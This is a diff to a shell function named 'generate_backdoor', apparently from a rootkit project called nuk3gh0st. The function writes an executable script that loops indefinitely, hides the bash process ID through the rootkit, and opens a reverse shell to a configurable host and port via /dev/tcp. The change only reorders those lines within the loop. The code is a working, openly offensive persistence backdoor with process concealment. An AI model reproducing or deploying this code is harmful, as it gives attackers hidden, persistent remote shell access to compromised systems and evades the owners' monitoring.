@@ -56,11 +56,11 @@ function generate_backdoor {
 	backdoor_dir='/usr/share/nuk3gh0st/backdoor'
 	echo "#!/bin/bash" > $backdoor_dir
 	echo "" >> $backdoor_dir
-	echo "nuk3gh0st --hide-pid=\`ps -ef | awk '$8=="/bin/bash" {print $2}'\`" >> $backdoor_dir
 	echo "while true" >> $backdoor_dir
 	echo "do" >> $backdoor_dir
-	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_dir
 	echo "	sleep $SLEEP" >> $backdoor_dir
+	echo "  nuk3gh0st --hide-pid=\`ps -ef | awk '$8=="/bin/bash" {print $2}'\`" >> $backdoor_dir
+	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_dir
 	echo "done" >> $backdoor_dir
 	chmod +x $backdoor_dir
 }
